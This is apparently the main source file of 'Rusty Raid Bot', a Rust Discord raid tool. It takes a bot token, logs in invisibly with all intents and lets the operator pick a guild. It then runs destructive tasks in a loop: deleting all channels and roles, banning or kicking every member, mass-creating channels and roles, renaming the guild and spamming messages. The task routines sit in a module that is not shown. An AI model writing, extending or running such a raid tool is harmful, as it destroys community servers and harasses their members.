mod tasks;

use clap::Parser;
use cliclack;
use colored::Colorize;
use crossterm::terminal;
use serenity::{
    all::{
        ClientBuilder, Context, EditGuild, EventHandler, GatewayIntents, GuildId, OnlineStatus,
        Ready,
    },
    async_trait,
};

#[derive(Parser)]
struct Args {
    #[clap(short, long)]
    token: Option<String>,
}

fn banner() {
    print!(
        "{}",
        r#"
  ____                  _               ____            _       _     ____            _   
 |  _ \   _   _   ___  | |_   _   _    |  _ \    __ _  (_)   __| |   | __ )    ___   | |_ 
 | |_) | | | | | / __| | __| | | | |   | |_) |  / _` | | |  / _` |   |  _ \   / _ \  | __|
 |  _ <  | |_| | \__ \ | |_  | |_| |   |  _ <  | (_| | | | | (_| |   | |_) | | (_) | | |_ 
 |_| \_\  \__,_| |___/  \__|  \__, |   |_| \_\  \__,_| |_|  \__,_|   |____/   \___/   \__|
                              |___/
"#.red()
    );

    println!(
        "{}",
        r#"
Made by Nehuén <https://github.com/nehu3n>
"#
        .magenta()
    );
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let mut token = args.token.unwrap_or("".to_string());

    cliclack::clear_screen()?;
    banner();

    token = if token.is_empty() {
        cliclack::input("Enter bot token")
            .required(true)
            .validate_on_enter(|v: &String| {
                if v.is_empty() {
                    Err("Token cannot be empty")
                } else {
                    Ok(())
                }
            })
            .interact::<String>()?
    } else {
        token
    };

    let mut client = ClientBuilder::new(token, GatewayIntents::all())
        .status(OnlineStatus::Offline)
        .event_handler(Handler)
        .await
        .unwrap();

    if let Err(e) = client.start().await {
        println!("An error occurred while running the client: {:?}", e);
    }
    Ok(())
}

const TASKS: [(&str, &str, &str); 8] = [
    ("create_ch", "Create channels", ""),
    ("delete_ch", "Delete all channels", ""),
    ("create_rl", "Create roles", ""),
    ("delete_rl", "Delete all roles", ""),
    ("ban_all", "Ban all", ""),
    ("kick_all", "Kick all", ""),
    ("change_name", "Change guild name", ""),
    ("spam_msg", "Spam message", ""),
];

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, _ready: Ready) {
        let guilds = ctx.cache.guilds();
        let mut items: Vec<(String, String, String)> = Vec::new();

        for guild in guilds {
            let info = ctx.http.get_guild(guild).await.unwrap();
            items.push((info.id.to_string(), info.name.clone(), String::new()));
        }

        let selected_guild = cliclack::select("Select a guild")
            .items(&items)
            .interact()
            .unwrap();

        let guild_id = GuildId::new(selected_guild.parse::<u64>().unwrap());

        loop {
            cliclack::clear_screen().unwrap();
            banner();

            let task = cliclack::select("Select a task")
                .items(&TASKS)
                .interact()
                .unwrap();

            match task {
                "create_ch" => {
                    let name = cliclack::input("Enter channel name")
                        .interact::<String>()
                        .unwrap();

                    tasks::create_channels(&name, &ctx, guild_id).await;
                }
                "delete_ch" => {
                    tasks::delete_channels(&ctx, guild_id).await;
                }
                "create_rl" => {
                    let name = cliclack::input("Enter role name")
                        .interact::<String>()
                        .unwrap();

                    tasks::create_roles(&name, &ctx, guild_id).await;
                }
                "delete_rl" => {
                    tasks::delete_roles(&ctx, guild_id).await;
                }
                "ban_all" => {
                    tasks::ban_all(&ctx, guild_id).await;
                }
                "kick_all" => {
                    tasks::kick_all(&ctx, guild_id).await;
                }
                "change_name" => {
                    let name = cliclack::input("Enter guild name")
                        .interact::<String>()
                        .unwrap();

                    let guild_builder = EditGuild::new().name(name);
                    guild_id.edit(&ctx.http, guild_builder).await.unwrap();
                }
                "spam_msg" => {
                    let message = cliclack::input("Enter spam message")
                        .multiline()
                        .interact::<String>()
                        .unwrap();

                    tasks::spam_message(&message, &ctx, guild_id).await;
                }
                _ => {}
            }
        }
    }
}
